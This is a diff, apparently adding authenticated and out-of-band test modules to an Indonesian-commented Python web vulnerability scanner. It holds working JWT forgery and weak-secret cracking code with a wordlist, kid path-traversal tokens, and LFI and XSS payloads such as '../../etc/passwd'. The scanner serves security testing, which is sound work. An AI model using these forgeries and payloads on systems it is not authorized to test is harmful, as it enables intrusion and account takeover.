@@ -11,11 +11,14 @@ Cara pakai:
 """
 
 import argparse
+import base64
 import csv
 import hashlib
+import hmac
 import html as htmlmod
 import json
 import re
+import secrets
 import socket
 import ssl
 import sys
@@ -101,6 +104,201 @@ def join(base, path):
     if path.startswith(("http://","https://")): return path
     return urllib.parse.urljoin(base, path)
 
+# ══════════════════════════════════════════════════════════════════
+# AUTH & OOB — prasyarat modul kelas kerentanan tingkat lanjut
+# ══════════════════════════════════════════════════════════════════
+
+# Daftar bawaan secret JWT lemah. Dipakai hanya untuk uji offline di mesin
+# tester; kalau salah satu kata ini cocok, token bisa dipalsukan siapa pun.
+DEFAULT_JWT_SECRETS = (
+    "secret", "secret123", "secretkey", "password", "password123", "123456",
+    "1234567890", "changeme", "jwt", "jwtsecret", "jwt_secret", "jwt-secret",
+    "mysecret", "mysecretkey", "supersecret", "topsecret", "admin", "root",
+    "test", "testing", "dev", "development", "default", "key", "apikey",
+    "api_key", "token", "appsecret", "application_secret", "s3cr3t",
+    "letmein", "qwerty", "spade", "example", "supersecretkey", "private",
+    "jwtkey", "jwt-key", "django-insecure", "laravel", "symmetrickey",
+)
+
+OOB_CHECK_DELAY = 5.0      # jeda sebelum tanya collector (beri waktu callback masuk)
+OOB_TIMEOUT = 5.0          # timeout cek collector
+OOB_TOKEN_BYTES = 4        # panjang token callback (hex)
+IDOR_MAX_CANDIDATES = 25   # batas URL objek yang diuji IDOR
+PARAM_MAX_URLS = 8         # batas URL untuk parameter discovery
+CRLF_MAX_PARAMS = 15       # batas parameter untuk uji CRLF
+AUTH_BYPASS_MAX_PATHS = 10 # batas path terlindungi untuk uji auth bypass
+JWT_CRAWL_TARGETS = 8    # batas halaman hasil crawl yang diuji sebagai orakel JWT
+
+def oob_token():
+    """Token callback unik per temuan OOB (aman dipakai di payload/log)."""
+    return "spade-" + secrets.token_hex(OOB_TOKEN_BYTES)
+
+def oob_base(oob_host):
+    """Normalisasi --oob-host menjadi base URL collector tanpa trailing slash."""
+    host = (oob_host or "").strip().rstrip("/")
+    if not host:
+        return ""
+    if not host.startswith(("http://", "https://")):
+        host = "http://" + host
+    return host
+
+def oob_callback_url(oob_host, token):
+    """URL callback yang disematkan ke payload (harus bisa diakses target)."""
+    return f"{oob_base(oob_host)}/{token}"
+
+def oob_check(sess, oob_host, token):
+    """Tanya collector milik tester apakah token ini pernah dipanggil.
+
+    Kontrak collector (`tools/oob_collector.py`): `GET /<token>` mencatat
+    callback, `GET /check?token=<token>` mengembalikan `{"token": .., "hits": n}`.
+    Collector yang hanya mengembalikan body berisi token juga diterima.
+    """
+    base = oob_base(oob_host)
+    if not base or not token:
+        return False, "collector OOB tidak dikonfigurasi"
+    url = f"{base}/check?token={urllib.parse.quote(token)}"
+    try:
+        r = sess.get(url, timeout=OOB_TIMEOUT)
+    except Exception as exc:
+        return False, f"gagal menghubungi collector: {type(exc).__name__}"
+    try:
+        payload = r.json()
+    except Exception:
+        payload = None
+    if isinstance(payload, dict):
+        try:
+            hits = int(payload.get("hits", 0))
+        except (TypeError, ValueError):
+            hits = 0
+        if hits > 0:
+            return True, f"collector mencatat {hits} callback"
+        return False, "belum ada callback"
+    if token in (r.text or ""):
+        return True, "collector mengembalikan token"
+    return False, "belum ada callback"
+
+def parse_cookie_arg(value):
+    """Ubah satu argumen --cookie menjadi daftar pasangan cookie tervalidasi."""
+    pairs = []
+    for chunk in (value or "").split(";"):
+        chunk = chunk.strip()
+        if not chunk:
+            continue
+        name, sep, val = chunk.partition("=")
+        name = name.strip()
+        if not sep or not name:
+            raise ValueError(f"format cookie tidak valid: {chunk!r} (butuh 'nama=nilai')")
+        pairs.append(f"{name}={val.strip()}")
+    if not pairs:
+        raise ValueError("nilai --cookie kosong")
+    return pairs
+
+def parse_header_arg(value):
+    """Ubah satu argumen -H/--header menjadi pasangan (nama, nilai)."""
+    name, sep, val = (value or "").partition(":")
+    name = name.strip()
+    if not sep or not name:
+        raise ValueError(f"format header tidak valid: {value!r} (butuh 'Nama: nilai')")
+    return name, val.strip()
+
+def build_auth_headers(cookies=(), headers=(), bearer=""):
+    """Rakit header autentikasi dari --cookie/-H/--bearer.
+
+    Cookie digabung jadi satu header `Cookie`; `--bearer` menolak digabung
+    dengan header `Authorization` dari `-H` supaya tidak ada ambiguitas.
+    """
+    jar = []
+    extra = OrderedDict()
+    for raw in cookies or ():
+        jar.extend(parse_cookie_arg(raw))
+    has_auth_header = False
+    for raw in headers or ():
+        name, value = parse_header_arg(raw)
+        if name.lower() == "cookie":
+            jar.extend(parse_cookie_arg(value))
+            continue
+        if name.lower() == "authorization":
+            has_auth_header = True
+        extra[name] = value
+    if bearer:
+        if has_auth_header:
+            raise ValueError("--bearer tidak bisa digabung dengan header Authorization dari -H")
+        extra["Authorization"] = f"Bearer {bearer}"
+    if jar:
+        # Buang duplikat nama cookie (pemanggil terakhir menang, seperti browser).
+        dedup = OrderedDict()
+        for pair in jar:
+            dedup[pair.split("=", 1)[0]] = pair
+        extra["Cookie"] = "; ".join(dedup.values())
+    return extra
+
+def _redact_auth_headers(headers):
+    """Versi aman-untuk-log dari header auth (dipakai di pesan terminal)."""
+    return ", ".join(
+        f"{name}=***" if name.lower() in ("cookie", "authorization") else f"{name}={value}"
+        for name, value in (headers or {}).items()
+    ) or "-"
+
+def raw_http_probe(host, port, payload, use_tls=False, timeout=8.0, max_bytes=65536):
+    """Kirim request HTTP mentah lewat socket, kembalikan respons mentah (bytes).
+
+    Dipakai modul request smuggling: curl_cffi (dan curl) selalu menormalkan
+    header sehingga CL.TE/TE.CL tidak bisa dikirim lewat jalur normal.
+    """
+    sock = None
+    try:
+        sock = socket.create_connection((host, port), timeout=timeout)
+        if use_tls:
+            context = ssl._create_unverified_context()
+            sock = context.wrap_socket(sock, server_hostname=host)
+        sock.settimeout(timeout)
+        sock.sendall(payload if isinstance(payload, bytes) else payload.encode())
+        try:
+            sock.shutdown(socket.SHUT_WR)
+        except OSError:
+            pass
+        chunks = []
+        total = 0
+        while total < max_bytes:
+            try:
+                data = sock.recv(4096)
+            except (socket.timeout, TimeoutError):
+                break
+            if not data:
+                break
+            chunks.append(data)
+            total += len(data)
+        return b"".join(chunks)
+    except Exception:
+        return None
+    finally:
+        if sock is not None:
+            try:
+                sock.close()
+            except Exception:
+                pass
+
+def parse_raw_response(raw):
+    """Urai respons HTTP mentah menjadi (status, headers, body_text)."""
+    if not raw:
+        return None, {}, ""
+    text = raw.decode("utf-8", "replace")
+    head, sep, body = text.partition("\r\n\r\n")
+    if not sep:
+        head, sep, body = text.partition("\n\n")
+    lines = head.splitlines()
+    status = None
+    if lines:
+        parts = lines[0].split()
+        if len(parts) >= 2 and parts[1].isdigit():
+            status = int(parts[1])
+    headers = {}
+    for line in lines[1:]:
+        name, sep2, value = line.partition(":")
+        if sep2:
+            headers.setdefault(name.strip(), value.strip())
+    return status, headers, body
+
 # ── HTTP layer (curl_cffi) ──
 DEFAULT_IMPERSONATE = "chrome"     # profil default: Chrome terbaru yang didukung curl_cffi
 TRANSPORT_RETRIES = 1              # retry error koneksi/DNS/TLS (ditangani curl_cffi)
@@ -143,7 +341,7 @@ def _retry_after_seconds(value):
         return 0.0
 
 
-def make_session(timeout=15, verify_ssl=True, impersonate=_DEFAULT):
+def make_session(timeout=15, verify_ssl=True, impersonate=_DEFAULT, extra_headers=None):
     """Buat satu curl_cffi Session dengan browser impersonation.
 
     User-Agent, sec-ch-ua, sec-fetch-*, dan Accept-Language tidak diset manual:
@@ -152,13 +350,21 @@ def make_session(timeout=15, verify_ssl=True, impersonate=_DEFAULT):
     Retry untuk error transport ditangani curl_cffi sendiri, sedangkan retry
     berdasarkan status HTTP (429/5xx) ditangani wrapper ThreadLocalSession.
 
+    `extra_headers` (Cookie/Authorization/header dari -H) disuntikkan ke
+    `session.headers` supaya ikut di setiap request. Header khas browser tetap
+    datang dari profil impersonate saat request dikirim, jadi paritas
+    fingerprint TLS + header tidak berubah.
+
     impersonate=None berarti impersonation dimatikan (mode paritas/debugging).
     """
     profile = DEFAULT_IMPERSONATE if impersonate is _DEFAULT else impersonate
     kwargs = {"timeout": timeout, "verify": verify_ssl, "retry": TRANSPORT_RETRIES}
     if profile:
         kwargs["impersonate"] = profile
-    return CurlSession(**kwargs)
+    session = CurlSession(**kwargs)
+    if extra_headers:
+        session.headers.update(extra_headers)
+    return session
 
 # ══════════════════════════════════════════════════════════════════
 # EVIDENCE — rekaman request/response sebagai bukti temuan
@@ -516,6 +722,28 @@ FINDING_META = {
     "XPOWERED_LEAK":        FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-200", "A05:2021", "firm"),
     "COOKIE_ISSUE":         FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-614", "A05:2021", "firm"),
     "FORM_HTTP":            FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-319", "A02:2021", "firm"),
+    # Kelas kerentanan tingkat lanjut (otorisasi objek, CSRF, JWT, auth bypass,
+    # API spec, host header/cache, CRLF, request smuggling, OOB).
+    "IDOR_READ":            FindingMeta("CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", 6.5, "CWE-639", "A01:2021", "tentative"),
+    "IDOR_ANON":            FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-284", "A01:2021", "firm"),
+    "CSRF_NO_TOKEN":        FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N", 4.3, "CWE-352", "A01:2021", "tentative"),
+    "CSRF_TOKEN_IGNORED":   FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N", 4.3, "CWE-352", "A01:2021", "firm"),
+    "JWT_WEAK_SECRET":      FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:N", 9.1, "CWE-798", "A07:2021", "firm"),
+    "JWT_ALG_CONFUSION":    FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", 7.4, "CWE-347", "A07:2021", "firm"),
+    "JWT_KID_TRAVERSAL":    FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", 7.4, "CWE-22", "A07:2021", "firm"),
+    "JWT_NO_EXPIRY":        FindingMeta("CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N", 3.1, "CWE-613", "A07:2021", "tentative"),
+    "JWT_EXPIRED_ACCEPTED": FindingMeta("CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", 6.5, "CWE-613", "A07:2021", "firm"),
+    "AUTH_BYPASS_HEADER":   FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-284", "A01:2021", "firm"),
+    "AUTH_BYPASS_PATH":     FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-284", "A01:2021", "firm"),
+    "API_SPEC_EXPOSED":     FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-200", "A01:2021", "firm"),
+    "HOST_HEADER_INJECTION": FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N", 4.2, "CWE-644", "A05:2021", "firm"),
+    "CACHE_POISONING":      FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N", 5.4, "CWE-349", "A05:2021", "tentative"),
+    "CACHE_DECEPTION":      FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-525", "A01:2021", "tentative"),
+    "REQUEST_SMUGGLING":    FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N", 8.7, "CWE-444", "A08:2021", "firm"),
+    "CRLF_INJECTION":       FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N", 4.3, "CWE-93", "A03:2021", "firm"),
+    "SSRF_BLIND":           FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-918", "A10:2021", "firm"),
+    "XXE_BLIND":            FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-611", "A05:2021", "firm"),
+    "CMDI_BLIND":           FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-78", "A03:2021", "firm"),
     # Temuan informasional: tidak ada skor CVSS yang berlaku, tapi CWE/OWASP tetap dipetakan.
     "TECH":                 FindingMeta(None, 0.0, "CWE-200", "A05:2021", "firm"),
     "JS_APIS":              FindingMeta(None, 0.0, "CWE-200", "A01:2021", "firm"),
@@ -525,6 +753,9 @@ FINDING_META = {
     "JWT_BEARER":           FindingMeta(None, 0.0, "CWE-522", "A07:2021", "firm"),
     "RATE_LIMIT":           FindingMeta(None, 0.0, "CWE-770", "A04:2021", "firm"),
     "NO_RATE_LIMIT":        FindingMeta(None, 0.0, "CWE-770", "A04:2021", "tentative"),
+    "JWT_ALG_CONFUSION_SURFACE": FindingMeta(None, 0.0, "CWE-347", "A07:2021", "tentative"),
+    "JWT_KID_SUSPECT":      FindingMeta(None, 0.0, "CWE-22", "A07:2021", "tentative"),
+    "PARAM_DISCOVERY":      FindingMeta(None, 0.0, "CWE-200", "A01:2021", "tentative"),
     "SCAN_ERROR":           FindingMeta(None, 0.0, None, None, "certain"),
 }
 
@@ -769,18 +1000,23 @@ class ThreadLocalSession:
     Session milik thread terkait lewat __getattr__.
     """
 
-    def __init__(self, timeout=15, verify_ssl=True, impersonate=_DEFAULT, retries=None):
+    def __init__(self, timeout=15, verify_ssl=True, impersonate=_DEFAULT, retries=None,
+                 extra_headers=None):
         self._local = threading.local()
         self.timeout = timeout
         self.verify_ssl = verify_ssl
         self.impersonate = impersonate
         self.retries = STATUS_RETRIES if retries is None else max(0, retries)
+        # Header auth (Cookie/Authorization/-H) dipakai tiap request. Salinan
+        # dibuat di sini supaya pemanggil tidak bisa mengubahnya di tengah scan.
+        self.extra_headers = dict(extra_headers or {})
 
     def _session(self):
         sess = getattr(self._local, "sess", None)
         if sess is None:
             sess = make_session(timeout=self.timeout, verify_ssl=self.verify_ssl,
-                                impersonate=self.impersonate)
+                                impersonate=self.impersonate,
+                                extra_headers=self.extra_headers)
             self._local.sess = sess
         return sess
 
@@ -1459,7 +1695,9 @@ def scan_sqli(sess, base_url, ctx=None):
                     return [("HIGH","SQLI",f"Parameter URL '{p}' rentan SQL injection (error-based, payload: {label}). Attacker bisa membaca/mengubah database. URL: {base_url}?{p}={payload[:30]}", f"{base_url}?{p}={payload[:30]}", f"SQL injection via parameter '{p}' dengan payload '{label}'")]
             except: pass
         return []
-    out = pmap_until(_check_url, ["id","page","p","q","cat","user","uid"])
+    # Parameter hasil panen spesifikasi API (kalau modul apispec jalan) ikut diuji.
+    url_params = list(dict.fromkeys(["id","page","p","q","cat","user","uid"] + spec_injection_targets(ctx)))
+    out = pmap_until(_check_url, url_params)
     if out:
         for sev, code, desc, url, msg in out:
             critical(msg)
@@ -1502,7 +1740,8 @@ def scan_xss(sess, base_url, ctx=None):
         '"><script>alert(1)</script>',
         "javascript:alert(1)",
     ]
-    params = ["q","s","search","query","id","page","name","text","term","keyword","msg","message","subject","comment"]
+    params = list(dict.fromkeys(["q","s","search","query","id","page","name","text","term","keyword","msg","message","subject","comment"]
+                                + spec_injection_targets(ctx)))
     
     # ── Reflected XSS via GET ──
     def _check_get(job):
@@ -1599,7 +1838,8 @@ def lfi_check(sess, base_url, ctx=None):
                     return [("HIGH","LFI",f"Parameter '{param}' di {base_url} memungkinkan pembacaan file server (path traversal). Attacker bisa membaca /etc/passwd dan file sensitif lainnya. Payload: {payload}", r.url, f"LFI terdeteksi via parameter '{param}'")]
         except: pass
         return []
-    out = pmap_until(_check, [(p, pl) for p in ["file","page","include","path","doc","load"] for pl in ["../../etc/passwd","../../etc/hosts"]])
+    lfi_params = list(dict.fromkeys(["file","page","include","path","doc","load"] + spec_injection_targets(ctx)))
+    out = pmap_until(_check, [(p, pl) for p in lfi_params for pl in ["../../etc/passwd","../../etc/hosts"]])
     if out:
         for sev, code, desc, url, msg in out:
             critical(msg)
@@ -1634,6 +1874,7 @@ def cmd_injection(sess, base_url, ctx=None):
         for sev, code, desc, url, msg in out:
             critical(msg)
             f.append((sev, code, desc, url))
+        f.extend(scan_oob_cmdi(sess, base_url, ctx))
         return f
     
     # ── Cek POST form ──
@@ -1665,7 +1906,10 @@ def cmd_injection(sess, base_url, ctx=None):
             for sev, code, desc, url, msg in out:
                 critical(msg)
                 f.append((sev, code, desc, url))
+            f.extend(scan_oob_cmdi(sess, base_url, ctx))
             return f
+    # Blind CMDi (tanpa output di respons) hanya terbukti lewat callback OOB.
+    f.extend(scan_oob_cmdi(sess, base_url, ctx))
     return f
 
 def ssrf_check(sess, base_url, ctx=None):
@@ -1723,6 +1967,8 @@ def ssrf_check(sess, base_url, ctx=None):
             for sev, code, desc, url, msg in out:
                 warn(msg)
                 f.append((sev, code, desc, url), evidence_url=url)
+    # Blind SSRF hanya bisa dibuktikan lewat callback OOB (butuh --oob-host).
+    f.extend(scan_oob_ssrf(sess, base_url, ctx))
     return f
 
 def rate_limit(sess, base_url, ctx=None):
@@ -1799,6 +2045,7 @@ def scan_xxe(sess, base_url, ctx=None):
         for sev, code, desc, url, msg in out:
             critical(msg)
             f.append((sev, code, desc, url))
+        f.extend(scan_oob_xxe(sess, base_url, ctx))
         return f
     
     # ── XXE via form POST ──
@@ -1836,7 +2083,10 @@ def scan_xxe(sess, base_url, ctx=None):
             for sev, code, desc, url, msg in out:
                 critical(msg)
                 f.append((sev, code, desc, url))
+            f.extend(scan_oob_xxe(sess, base_url, ctx))
             return f
+    # Blind XXE (entity eksternal tanpa output) hanya terbukti lewat callback OOB.
+    f.extend(scan_oob_xxe(sess, base_url, ctx))
     return f
 
 def scan_nosqli(sess, base_url, ctx=None):
@@ -1938,31 +2188,330 @@ def scan_js(sess, base_url, ctx=None):
     except: pass
     return f
 
+# ── JWT: helper offline (stdlib saja, tanpa dependency eksternal) ──
+
+def b64url_encode(raw):
+    """Encode bytes jadi segmen base64url tanpa padding (format JWT)."""
+    return base64.urlsafe_b64encode(raw).decode().rstrip("=")
+
+def b64url_decode(segment):
+    """Decode segmen base64url tanpa padding. None kalau tidak valid."""
+    if not isinstance(segment, str) or not segment:
+        return None
+    try:
+        return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))
+    except Exception:
+        return None
+
+def jwt_parts(token):
+    """(header, payload, signature, token) dari sebuah JWT, atau None kalau bukan JWT."""
+    if not isinstance(token, str) or token.count(".") != 2:
+        return None
+    head, body, signature = token.split(".")
+    if not head or not body:
+        return None
+    header = b64url_decode(head); body_raw = b64url_decode(body)
+    if header is None or body_raw is None:
+        return None
+    try:
+        header = json.loads(header.decode("utf-8", "replace"))
+        payload = json.loads(body_raw.decode("utf-8", "replace"))
+    except Exception:
+        return None
+    if not isinstance(header, dict):
+        return None
+    return header, (payload if isinstance(payload, dict) else {}), signature, token
+
+def jwt_sign(header, payload, key, sign_alg="HS256"):
+    """Bikin JWT: header/payload apa adanya, tanda tangan HMAC dari `key`.
+
+    `sign_alg` memisahkan algoritma HMAC yang benar-benar dipakai dari klaim
+    `alg` di header — inti uji alg confusion (klaim RS256 + tanda tangan HMAC).
+    """
+    digest = JWT_HMAC_ALGS.get(sign_alg)
+    if digest is None:
+        return None
+    head = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+    body = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+    raw_key = key if isinstance(key, bytes) else str(key).encode()
+    mac = hmac.new(raw_key, f"{head}.{body}".encode(), digest).digest()
+    return f"{head}.{body}.{b64url_encode(mac)}"
+
+def jwt_crack_hmac(token, secrets):
+    """Cari secret HMAC token dari daftar kandidat (offline, tanpa request)."""
+    parsed = jwt_parts(token)
+    if parsed is None:
+        return None
+    header, _payload, signature, _raw = parsed
+    digest = JWT_HMAC_ALGS.get(str(header.get("alg") or ""))
+    if digest is None or not signature:
+        return None
+    expected = b64url_decode(signature)
+    if expected is None:
+        return None
+    signing_input = token.rsplit(".", 1)[0].encode()
+    for secret in secrets:
+        raw = secret if isinstance(secret, bytes) else str(secret).encode()
+        if hmac.compare_digest(hmac.new(raw, signing_input, digest).digest(), expected):
+            return secret
+    return None
+
+def jwt_secret_candidates(ctx):
+    """Kandidat secret untuk crack HMAC: punya tester (--jwt-secrets) lalu bawaan."""
+    out, seen = [], set()
+    for secret in list((ctx or {}).get("jwt_secrets") or ()) + list(DEFAULT_JWT_SECRETS):
+        if secret and secret not in seen:
+            seen.add(secret)
+            out.append(secret)
+    return out
+
+def _auth_sources(sess, resp=None):
+    """Sumber header yang mewakili request scan: session default + request nyata."""
+    return [src for src in (sess, getattr(resp, "request", None)) if src is not None]
+
+def auth_header_candidates(sess, resp=None):
+    """Nilai mentah header `Authorization` yang terlihat scan (dengan skema).
+
+    Dipakai untuk mengenali token JWT yang dikirim tester (`--bearer` atau
+    `-H "Authorization: ..."`) maupun yang datang dari respons.
+    """
+    out = OrderedDict()
+    for source in _auth_sources(sess, resp):
+        try:
+            headers = dict(source.headers)
+        except Exception:
+            continue
+        for name, value in headers.items():
+            if isinstance(value, str) and name.lower() == "authorization":
+                out[name] = value
+    return out
+
+def cookie_candidates(sess, resp=None):
+    """Pasangan (nama, nilai) cookie yang benar-benar dipakai scan.
+
+    Dua sumber digabung: header `Cookie` sesi dan cookie jar. Header dibaca
+    lebih dulu karena `--cookie`/`-H "Cookie: ..."` disuntikkan sebagai header
+    mentah ke session, bukan ke cookie jar curl_cffi; cookie jar (hasil
+    `Set-Cookie`) hanya mengisi nama yang belum ada.
+    """
+    jar = OrderedDict()
+    for source in _auth_sources(sess, resp):
+        try:
+            headers = dict(source.headers)
+        except Exception:
+            continue
+        for name, value in headers.items():
+            if not isinstance(value, str) or name.lower() != "cookie":
+                continue
+            for chunk in value.split(";"):
+                cname, sep, cval = chunk.strip().partition("=")
+                if sep and cname.strip():
+                    jar[cname.strip()] = cval.strip()
+    try:
+        for name, value in sess.cookies.items():
+            jar.setdefault(name, value)
+    except Exception:
+        pass
+    return jar
+
+def jwt_tokens(sess, resp=None):
+    """Kandidat token JWT dari cookie yang dipakai scan + header Authorization."""
+    found, seen = [], set()
+
+    def _add(where, name, value):
+        if not isinstance(value, str) or value.count(".") != 2 or (name, value) in seen:
+            return
+        seen.add((name, value))
+        found.append((where, name, value))
+
+    for cname, cvalue in cookie_candidates(sess, resp).items():
+        _add("cookie", cname, cvalue)
+    for _name, raw in auth_header_candidates(sess, resp).items():
+        token = raw[7:].strip() if raw.startswith("Bearer ") else raw.strip()
+        _add("header", "Authorization", token)
+    return found
+
+def jwt_kid_suspect(kid):
+    """True kalau klaim `kid` menunjuk ke luar direktori kunci (path/URL/absolut)."""
+    if not isinstance(kid, str) or not kid:
+        return False
+    low = kid.lower()
+    return (".." in kid or "\\" in kid or low.startswith(("http://", "https://", "file:", "/"))
+            or low.endswith((".pem", ".key", ".json")))
+
+def jwt_expired(payload):
+    """True kalau klaim `exp` sudah lewat."""
+    exp = (payload or {}).get("exp")
+    return isinstance(exp, (int, float)) and exp < time.time()
+
+def jwt_protected_targets(sess, base_url, ctx):
+    """Endpoint terlindungi yang layak jadi orakel token: 200 sesi vs 401/403 anonim."""
+    if (ctx or {}).get("anon_sess") is None:
+        return []
+    crawler = (ctx or {}).get("crawler")
+    paths = list(JWT_PROTECTED_PATHS)
+    if crawler and crawler.pages:
+        paths.extend(list(crawler.pages)[:JWT_CRAWL_TARGETS])
+    out = []
+    for path in dict.fromkeys(paths):
+        url = join(base_url, path)
+        try:
+            authed = sess.get(url, timeout=10)
+            denied = (ctx or {})["anon_sess"].get(url, timeout=10)
+        except Exception:
+            continue
+        if authed.status_code == 200 and denied.status_code in (401, 403):
+            out.append((url, _resp_fingerprint(authed)))
+    return out
+
+def jwt_accepted(sess, url, token, fingerprint):
+    """True kalau server menerima token yang dikirim penyerang di URL terlindungi."""
+    try:
+        resp = sess.get(url, headers={"Authorization": f"Bearer {token}"}, timeout=10)
+    except Exception:
+        return False
+    return resp.status_code == 200 and _resp_fingerprint(resp) == fingerprint
+
+def jwt_public_key(sess, base_url):
+    """Public key server (PEM/JWKS) untuk uji alg confusion; None kalau tidak ada."""
+    for path in JWT_KEY_PATHS:
+        url = join(base_url, path)
+        try:
+            resp = sess.get(url, timeout=10)
+        except Exception:
+            continue
+        if resp.status_code != 200:
+            continue
+        text = resp.text or ""
+        if "BEGIN PUBLIC KEY" in text or "BEGIN CERTIFICATE" in text:
+            return url, text
+        try:
+            payload = resp.json()
+        except Exception:
+            continue
+        keys = payload.get("keys") if isinstance(payload, dict) else None
+        if any(isinstance(key, dict) and "kty" in key for key in (keys or [])):
+            return url, text
+    return None
+
 def scan_jwt(sess, base_url, ctx=None):
     f = FindingList(base_url); info("Menganalisis JWT...")
     try:
         r = get_base_response(sess, base_url, ctx)
-        if r is None:
-            return f
-        for ck, cv in sess.cookies.items():
-            if cv.count(".")==2:
-                try:
-                    import base64 as b64
-                    def b64d(s): s=s+"="*(4-len(s)%4); return json.loads(b64.b64decode(s.replace("-","+").replace("_","/")).decode())
-                    h = b64d(cv.split(".")[0])
-                    if isinstance(h, dict):
-                        if h.get("alg")=="none":
-                            critical(f"JWT di cookie '{ck}' menggunakan alg=none")
-                            f.append(("CRITICAL","JWT_ALG_NONE",f"JWT di cookie '{ck}' menggunakan algoritma 'none'. Attacker bisa memalsukan token dengan payload apa pun tanpa tanda tangan dan mendapatkan akses tidak sah."))
-                        else:
-                            info(f"JWT di cookie '{ck}', alg={h.get('alg')}")
-                            f.append(("INFO","JWT_COOKIE",f"Cookie '{ck}' berisi JWT (alg={h.get('alg')}). Token perlu dievaluasi manual untuk validasi signature, expiry, dan klaim."))
-                except: pass
-        auth = r.request.headers.get("Authorization","")
-        if auth.startswith("Bearer "):
-            t = auth[7:]
-            if t.count(".")==2: f.append(("INFO","JWT_BEARER","Authorization header menggunakan Bearer token JWT. Periksa validitas token secara manual."))
     except: pass
+    if r is not None:
+        for ck, cv in cookie_candidates(sess, r).items():
+            parts = jwt_parts(cv)
+            if parts is None:
+                continue
+            alg = parts[0].get("alg")
+            if alg == "none":
+                critical(f"JWT di cookie '{ck}' menggunakan alg=none")
+                f.append(("CRITICAL","JWT_ALG_NONE",f"JWT di cookie '{ck}' menggunakan algoritma 'none'. Attacker bisa memalsukan token dengan payload apa pun tanpa tanda tangan dan mendapatkan akses tidak sah."))
+            else:
+                info(f"JWT di cookie '{ck}', alg={alg}")
+                f.append(("INFO","JWT_COOKIE",f"Cookie '{ck}' berisi JWT (alg={alg}). Token perlu dievaluasi manual untuk validasi signature, expiry, dan klaim."))
+        bearer = any(v.startswith("Bearer ") and v[7:].strip().count(".")==2
+                     for v in auth_header_candidates(sess, r).values())
+        if bearer:
+            f.append(("INFO","JWT_BEARER","Authorization header menggunakan Bearer token JWT. Periksa validitas token secara manual."))
+
+    # ── Uji offline: klaim 'kid' mencurigakan + crack secret HMAC lemah ──
+    tokens = jwt_tokens(sess, r)
+    candidates = jwt_secret_candidates(ctx)
+    weak = None
+    for _where, name, token in tokens:
+        parts = jwt_parts(token)
+        if parts is None:
+            continue
+        kid = parts[0].get("kid")
+        if jwt_kid_suspect(kid):
+            warn(f"Klaim 'kid' mencurigakan di token {name}: {kid}")
+            f.append(("INFO","JWT_KID_SUSPECT",
+                      f"Token {name} membawa klaim 'kid' bernilai '{kid}' — bentuknya path/URL, bukan nama kunci biasa. "
+                      f"Kalau server memakai nilai ini untuk memuat file kunci, penyerang bisa mengarahkannya ke file "
+                      f"yang dikendalikan (path traversal / key injection).",
+                      base_url, None), evidence_url=base_url)
+        if weak is None:
+            secret = jwt_crack_hmac(token, candidates)
+            if secret is not None:
+                weak = (name, secret)
+                critical(f"Secret JWT lemah tertebak: {name}")
+                f.append(("CRITICAL","JWT_WEAK_SECRET",
+                          f"Token {name} ditandatangani HMAC dengan secret lemah ({secret!r}) yang ada di daftar kata "
+                          f"umum. Siapa pun bisa membuat token dengan klaim apa pun — termasuk mengaku admin — tanpa "
+                          f"kredensial sekalipun.",
+                          base_url, f"Secret JWT lemah: {secret!r}"), evidence_url=base_url)
+
+    # ── Uji penerimaan token palsu: kid traversal, alg confusion, klaim exp ──
+    if not _ctx_flag(ctx, "auth_enabled") or (ctx or {}).get("anon_sess") is None:
+        if tokens:
+            info("  (uji kid/alg-confusion/exp dilewati: butuh sesi autentikasi — pakai --cookie/-H/--bearer)")
+        return f
+    targets = jwt_protected_targets(sess, base_url, ctx)
+    if not targets:
+        info("  Tidak ada endpoint terlindungi (200 sesi vs 401/403 anonim) — uji token palsu dilewati")
+        return f
+    info(f"  {len(targets)} endpoint terlindungi diuji ulang dengan token palsu")
+
+    claims = {"sub": "spade", "iat": int(time.time())}
+    forgeries = [("JWT_KID_TRAVERSAL",
+                  jwt_sign({"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}, claims, b""))]
+    public = jwt_public_key(sess, base_url)
+    if public is None:
+        info("  Public key/JWKS tidak ditemukan — uji alg confusion dilewati")
+    else:
+        key_url, key_text = public
+        info(f"  Public key ditemukan di {key_url} — uji alg confusion")
